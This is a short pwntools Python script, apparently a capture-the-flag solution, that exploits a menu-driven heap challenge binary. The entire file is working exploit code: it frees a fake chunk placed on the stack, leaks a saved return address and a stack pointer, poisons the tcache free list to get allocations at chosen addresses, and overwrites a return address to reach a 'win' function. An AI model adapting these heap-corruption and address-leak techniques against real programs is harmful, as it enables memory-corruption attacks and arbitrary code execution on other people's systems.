#!/bin/python

from pwn import *
import sys

#context.log_level='debug'

STACK_OFFSET = 0x38
SAVED_RIP_OFF= 0x58

def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def echo(idx, offset):
    proc.clean()
    proc.sendline(b"echo")
    proc.sendline(str(idx))
    proc.sendline(str(offset))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


bin_idx = 16
def overwrite_next(contents: bytes):
    global bin_idx

    ret = bin_idx
    malloc(14, ret)
    malloc(15, ret)
    bin_idx += 16

    free(15)
    free(14)

    scanf(14, contents)
    return ret


def get_custom_ptr(contents: bytes):
    bin = overwrite_next(contents)
    malloc(13, bin)
    malloc(13, bin)

    return 13


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


if len(sys.argv) == 2:
    proc = process(sys.argv[1])
else:
    proc = gdb.debug(sys.argv[1], gdbscript='''
                     pwndbg-init
                     b main
                     c
                     nextret
                     ''')
elf = proc.elf

size = 16 * 9 
proc.sendline(b'stack_scanf')
proc.sendline(cyclic(STACK_OFFSET)+p64(size))
proc.sendline(b'stack_free')

malloc(0, size - 16)
saved_rip = get_addr_num((echo(0, SAVED_RIP_OFF)))
print("[$] saved rip: " + hex(saved_rip))

malloc(1, size - 16)
free(0)
free(1)
stack_leak = get_addr_num(echo(1, 0)) + SAVED_RIP_OFF
print("[$] stack leak: " + hex(stack_leak))

echo_saved_rip = stack_leak - 0x1d0 - 16
idx = get_custom_ptr(p64(echo_saved_rip))
ret_rip = (get_addr_num(echo(idx, 0)) & 0xFFFFFFFFF000) - 0x1000 
print("[$] return rip from echo: "+ hex(ret_rip))

idx = get_custom_ptr(p64(stack_leak-1))
scanf(idx, b'X' + p64(ret_rip + (elf.symbols['win'] & 0x0FFF)))

proc.interactive()
